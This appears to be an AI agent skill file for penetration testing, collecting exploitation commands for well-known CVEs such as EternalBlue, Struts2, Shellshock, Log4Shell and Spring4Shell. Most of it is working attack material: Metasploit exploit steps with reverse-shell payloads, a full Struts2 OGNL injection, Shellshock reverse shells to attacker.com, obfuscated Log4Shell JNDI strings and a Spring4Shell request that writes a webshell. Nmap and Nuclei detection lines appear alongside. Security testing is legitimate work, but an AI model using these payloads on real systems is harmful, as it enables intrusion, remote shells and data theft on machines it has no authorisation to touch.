---
name: cve-exploits
description: Common CVE exploitation techniques and known vulnerability payloads. Use for known vulnerability testing.
---

# CVE Exploits

## Description
This skill covers common CVE (Common Vulnerabilities and Exposures) exploitation techniques for well-known vulnerabilities. Understanding these CVEs is essential for penetration testing and security assessments.

## CVE Resources

### Research Tools
- [Trickest CVE Repository](https://github.com/trickest/cve) - Searchable CVE database
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates) - Automated CVE detection
- [CVE Details](https://www.cvedetails.com/) - CVE information database
- [Exploit-DB](https://www.exploit-db.com/) - Exploit database
- [NVD](https://nvd.nist.gov/) - National Vulnerability Database

## Critical CVEs

### EternalBlue (CVE-2017-0144)
**Target:** Microsoft Windows SMB Protocol
**Impact:** Remote Code Execution
**CVSS:** 9.8 (Critical)

**Affected Systems:**
- Windows Vista SP2
- Windows 7 SP1
- Windows 8.1
- Windows 10
- Windows Server 2008/2012/2016

**Exploitation:**
```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# Standalone scanner
nmap -p 445 --script smb-vuln-ms17-010 target_ip
```

### BlueKeep (CVE-2019-0708)
**Target:** Remote Desktop Services
**Impact:** Remote Code Execution (Pre-authentication, no interaction)
**CVSS:** 9.8 (Critical)

**Affected Systems:**
- Windows XP
- Windows 7
- Windows Server 2003/2008/2008 R2

**Exploitation:**
```bash
# Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Detection
nmap -p 3389 --script rdp-vuln-cve2019-0708 target_ip
```

### Apache Struts 2 RCE (CVE-2017-5638)
**Target:** Apache Struts 2
**Impact:** Remote Code Execution via Content-Type header
**CVSS:** 10.0 (Critical)

**Exploitation:**
```bash
# Content-Type header injection
curl -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://target/action
```

### Drupalgeddon 2 (CVE-2018-7600)
**Target:** Drupal 7.x and 8.x
**Impact:** Remote Code Execution
**CVSS:** 9.8 (Critical)

**Exploitation:**
```bash
# Drupal 8
curl -X POST "http://target/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -d "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

# Metasploit
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS target
exploit
```

### Heartbleed (CVE-2014-0160)
**Target:** OpenSSL 1.0.1 to 1.0.1f
**Impact:** Information Disclosure (Memory leak)
**CVSS:** 7.5 (High)

**Exploitation:**
```bash
# Nmap detection
nmap -p 443 --script ssl-heartbleed target

# Metasploit
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS target
run

# Manual test
python heartbleed.py target -p 443
```

### Shellshock (CVE-2014-6271)
**Target:** GNU Bash
**Impact:** Remote Code Execution
**CVSS:** 9.8 (Critical)

**Exploitation:**
```bash
# CGI-based attack
curl -A "() { :; }; /bin/bash -c 'id'" http://target/cgi-bin/vulnerable.cgi

# User-Agent payload
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/attacker/4444 0>&1

# Reverse shell
curl -H "User-Agent: () { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'" http://target/cgi-bin/test.cgi

# Environment variable
env x='() { :;}; echo vulnerable' bash -c "echo test"
```

### Citrix ADC/Netscaler (CVE-2019-19781)
**Target:** Citrix ADC, Gateway, SD-WAN
**Impact:** Remote Code Execution
**CVSS:** 9.8 (Critical)

**Exploitation:**
```bash
# Path traversal + RCE
curl -k "https://target/vpn/../vpns/cfg/smb.conf" -H "NSC_USER: ../../../netscaler/portal/templates/test"

# Detection
curl -k "https://target/vpn/../vpns/portal/scripts/newbm.pl"
```

### Log4Shell (CVE-2021-44228)
**Target:** Apache Log4j 2.x
**Impact:** Remote Code Execution
**CVSS:** 10.0 (Critical)

**Exploitation:**
```bash
# Basic payload
${jndi:ldap://attacker.com/exploit}

# Encoded payloads
${${lower:j}ndi:${lower:l}dap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/x}

# In headers
User-Agent: ${jndi:ldap://attacker.com/a}
X-Api-Version: ${jndi:ldap://attacker.com/a}
Authorization: ${jndi:ldap://attacker.com/a}

# RCE server setup
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "command" -A attacker_ip
```

### ProxyLogon (CVE-2021-26855)
**Target:** Microsoft Exchange Server
**Impact:** Remote Code Execution
**CVSS:** 9.8 (Critical)

**Exploitation:**
```bash
# SSRF Detection
curl -k "https://target/ecp/x.js" -H "Cookie: X-BEResource=localhost~443/autodiscover/autodiscover.xml?#"

# Metasploit
use exploit/windows/http/exchange_proxylogon_rce
set RHOSTS target
exploit
```

### Spring4Shell (CVE-2022-22965)
**Target:** Spring Framework
**Impact:** Remote Code Execution
**CVSS:** 9.8 (Critical)

**Exploitation:**
```bash
# Write webshell
curl -X POST "http://target/path" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```

## Detection with Nuclei

```bash
# Scan for specific CVE
nuclei -t cves/2021/CVE-2021-44228.yaml -u http://target

# Scan for all CVEs
nuclei -t cves/ -u http://target

# Scan multiple targets
nuclei -t cves/ -l targets.txt
```

## Metasploit Quick Reference

```bash
# Search for exploits
search cve:2021-44228
search type:exploit platform:windows

# Use exploit
use exploit/path/to/module
show options
set RHOSTS target
exploit
```

## CVE Tracking Workflow

1. **Identify Technology Stack**
   - Version detection
   - Service fingerprinting

2. **Search for CVEs**
   - NVD database
   - Vendor advisories
   - Exploit databases

3. **Verify Vulnerability**
   - Use Nuclei templates
   - Manual testing
   - PoC verification

4. **Exploitation**
   - Metasploit modules
   - Public exploits
   - Custom exploitation

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CVE%20Exploits
- https://cve.mitre.org/
- https://nvd.nist.gov/
